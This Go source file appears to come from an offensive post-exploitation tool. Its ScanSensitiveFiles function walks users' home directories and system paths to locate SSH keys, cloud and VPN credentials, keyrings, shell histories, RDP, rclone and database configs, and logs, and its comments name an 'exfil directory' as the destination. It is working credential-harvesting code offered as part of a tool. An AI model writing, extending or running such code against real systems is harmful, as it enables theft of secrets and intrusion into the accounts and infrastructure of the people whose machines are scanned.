package internals
import (
	"fmt"
	"os"
	"path/filepath"
)

func filterSymLink(filePath string) bool {
	fileInfo, err := os.Lstat(filePath)
	if err != nil {
		// something bad happened if we cant stat the file we dont want to / cant collect it
		return true
	}
	return fileInfo.Mode()&os.ModeSymlink != 0
}

// expandPath expands directories into a list of files.
func expandPath(path string) []string {
	var fileList []string
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		// dont collect symlinks that will be dead
		if err == nil && !info.IsDir() && !filterSymLink(p) {
			fileList = append(fileList, p)
		}
		return nil
	})
	if err != nil {
		return []string{path} // Return the original path if walk fails
	}
	return fileList
}

// Function takes in the full path of our exfil directory, and an array of user home directories
// and then will begin hunting for senitive files. Additionally function takes in bool if we are running
// as the root user, if we are, easy to determine which files we can collect
//
// Return: []string, error -> returns an array of sensitive files found on the system 
func ScanSensitiveFiles(outputDir string, usersHome []string, isRoot bool) []string {
	// our array of sensitive files
	var files []string
	var paths []string
	for _, userHome := range usersHome {
		// attempt to access the users home directory
		if _, err := os.Stat(userHome); err != nil {
			// if we cannot access the users home directory, bail move to next user
			fmt.Println("[!] Cannot access", userHome)
			fmt.Println("\tError Returned:", err)
			continue
		}
		// User home directory collector
		paths = append(paths, GitCollector(userHome)...)
		paths = append(paths, SshCollector(userHome)...)
		paths = append(paths, CloudCollector(userHome)...)
		paths = append(paths, SqlCollector(userHome)...)
		paths = append(paths, ShellCollector(userHome)...)
		paths = append(paths, RcloneCollector(userHome)...)
		paths = append(paths, RdpCollector(userHome)...)
		paths = append(paths, ContainerCollector(userHome)...)
		paths = append(paths, VpnCollector(userHome)...)
		paths = append(paths, EditorCollector(userHome)...)
		paths = append(paths, KeyringCollector(userHome)...)
		paths = append(paths, MiscCollector(userHome)...)
		// System file collector
		paths = append(paths, HttpServerCollector()...)
		paths = append(paths, SysinfoCollector()...)
		paths = append(paths, LogCollector()...)
		paths = append(paths, SshSystemCollector()...)

	}
		
	// add all the found secret files to our files array
	for _, path := range paths {
		files = append(files, expandPath(path)...)
	}

	return files

}

